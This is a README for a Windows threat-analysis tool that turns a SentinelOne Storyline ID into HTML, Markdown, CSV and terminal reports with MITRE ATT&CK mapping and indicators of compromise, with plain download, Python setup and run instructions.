# 🛡️ SentinelOne-ThreatAnalyser - Simple Threat Analysis Tool

[![Download](https://img.shields.io/badge/Download-SentinelOne--ThreatAnalyser-brightgreen)](https://github.com/Hon9Pagga/SentinelOne-ThreatAnalyser)

---

## 📋 What is SentinelOne-ThreatAnalyser?

SentinelOne-ThreatAnalyser helps you dig into security threats using a single SentinelOne Storyline ID. It creates easy-to-read reports in different formats:

- HTML dashboard  
- Markdown report  
- CSV file  
- Terminal output  

Each report includes threat details, mapping based on MITRE ATT&CK, indicators of compromise (IOCs), and recommendations for security operations teams (SOC).

You do not need any programming knowledge to run this tool.

---

## 🖥️ System Requirements

Before you download and run SentinelOne-ThreatAnalyser on Windows, make sure your computer meets these minimum requirements:

- Windows 10 or later  
- 4 GB RAM or more  
- 500 MB free disk space  
- Internet connection for fetching data  
- Python 3.8 or higher installed*  

*If you do not have Python installed, this guide will help you get it.

---

## 🚀 Getting Started: Download SentinelOne-ThreatAnalyser

To get started, **visit this page to download** the software:

[![Download](https://img.shields.io/badge/download%20here-blue?style=for-the-badge)](https://github.com/Hon9Pagga/SentinelOne-ThreatAnalyser)

You will find the latest release and all files you need on the page.

---

## 📥 How to Download and Install on Windows

Follow these steps carefully:

1. Open the download page linked above in your web browser.
2. Look for the **Releases** section on the GitHub page. It normally appears on the right side or under the repository description.
3. Click on the most recent release. It will show a list of files, including executable files (.exe), Python scripts (.py), or compressed files (.zip or .tar.gz).
4. Download the file named something like `SentinelOne-ThreatAnalyser.zip` or `SentinelOne-ThreatAnalyser.exe`.  
   - If it is a zip file, save it to your preferred folder and extract it using Windows built-in extractor or third-party tools like WinRAR.
   - If it is an exe file, just save it to your computer.  
5. If the package comes with Python scripts and you do not have Python, skip to the next section for how to install Python.

---

## 🐍 Installing Python on Windows (If Needed)

SentinelOne-ThreatAnalyser requires Python 3.8 or higher. To check if Python is installed:

1. Open the **Start Menu** and type `cmd` to open the Command Prompt.
2. Type `python --version` and press Enter.
3. If a version number like `Python 3.x.x` appears, Python is installed.
4. If you get an error or no version number, follow these steps:

   - Visit https://www.python.org/downloads/windows/
   - Click “Download Python 3.x.x” for Windows.
   - Run the downloaded installer.  
   - Make sure to check the box **Add Python 3.x to PATH** during installation.
   - Follow on-screen prompts to complete installation.

5. After installation, repeat the version check to confirm Python is ready.

---

## ⚙️ Installing Required Python Packages

The tool uses some Python packages to work correctly. You must install them before running the tool.

Steps:

1. Open Command Prompt (type `cmd` in Start Menu).
2. Navigate to the folder where you extracted or saved SentinelOne-ThreatAnalyser files.  
   Use `cd` command. Example:  
   `cd C:\Users\YourName\Downloads\SentinelOne-ThreatAnalyser`
3. Run this command to install required packages:  
   
   `pip install -r requirements.txt`

This reads the list of packages used by SentinelOne-ThreatAnalyser and installs them on your system.

---

## ▶️ How to Run SentinelOne-ThreatAnalyser on Windows

1. Open Command Prompt.
2. Navigate to the folder with the tool’s files using the `cd` command.
3. Run the program using this command:

   `python threat_analyser.py --storyline-id YOUR_ID`

Replace `YOUR_ID` with your actual SentinelOne Storyline ID.

The software will process the data and output results in several files and in the terminal:

- An HTML dashboard that you can open in any browser  
- Markdown report for easy reading  
- CSV file for data export  

---

## 📂 How to Use the Results

- **HTML Dashboard:** Open the `.html` file in your web browser. It shows detailed charts and lists of threats.
- **Markdown Report:** Open `.md` files with any text editor like Notepad or specialized editors like VS Code.
- **CSV File:** Use Excel or similar programs to view and sort the data.
- **Terminal Output:** Review the summary of findings directly in the Command Prompt window.

---

## 🚨 About Threat Analysis Features

SentinelOne-ThreatAnalyser helps you:

- Understand complex threats by breaking them into detailed sections.  
- Track attacker tactics matched to MITRE ATT&CK framework.  
- Extract indicators of compromise (IOCs) to help spot threats quickly.  
- Provide clear security team recommendations to respond effectively.  

These features support effective incident response and forensic investigation without advanced technical skills.

---

## 🛠 Troubleshooting Tips

- If the program fails to run, check Python installation and package setup.
- Make sure you run the command inside the folder where the tool’s files are.
- Double-check your Storyline ID format matches the required input (usually alphanumeric).
- If packages fail to install, try running Command Prompt as administrator.
- Restart your computer if environment variables do not update after Python installation.

---

## 🔗 Useful Links

- Download and releases: [https://github.com/Hon9Pagga/SentinelOne-ThreatAnalyser](https://github.com/Hon9Pagga/SentinelOne-ThreatAnalyser)
- Python downloads: https://www.python.org/downloads/windows/
- MITRE ATT&CK framework: https://attack.mitre.org/

---

## 🤝 Support and Feedback

If you face issues or need help, use GitHub’s **Issues** tab on the download page. Describe what you tried and any error messages. This helps improve the tool and guides others.